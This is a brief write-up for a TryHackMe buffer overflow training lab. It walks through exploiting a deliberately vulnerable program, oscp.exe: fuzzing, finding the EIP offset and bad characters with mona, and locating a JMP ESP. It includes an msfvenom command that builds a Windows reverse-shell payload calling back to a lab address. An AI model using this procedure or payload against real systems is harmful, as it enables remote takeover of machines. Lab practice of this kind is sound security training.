# Writeup for [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)


```
set -gx IP 10.10.62.45
```


## Task 1: Deploy VM

* Deploy VM

## Task 2 oscp.exe - OVERFLOW1

* fuzzer.py to find length of bytes when program crashes
* generate bytearray with python script
* generate bytearray with mona
* find address ESP is pointing to
  * ESP points to '0189FA30'
* compare bytearrays with mona `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`
* Bad chars: '00 07 2e a0'
* find jumping point `!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"`
* generate payload `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.141 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c`


1. replace `prefix` in fuzzer.py
2. execute `python fuzzer.py`
3. create pattern with found size `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100`
4. copy pattern in `payload` variable in `exploit.py`-file
5. restart oscp.exe
6. execute `python exploit.py`
7. find crash `!mona findmsp -distance 2100`
8. save EIP offset in `offset`-variable
9. execute `python generate-bytearray.py`
10. copy output in `payload`-variable
11. generate bytearray `!mona bytearray -b "\x00"`
12. compare bytearrays at ESP position `!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30`
13. copy bad chars and remove in payload variable
14. restart oscp.exe
11. generate bytearray with found badchars `!mona bytearray -b "\x00"`
12. compare bytearrays at ESP position `!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30`
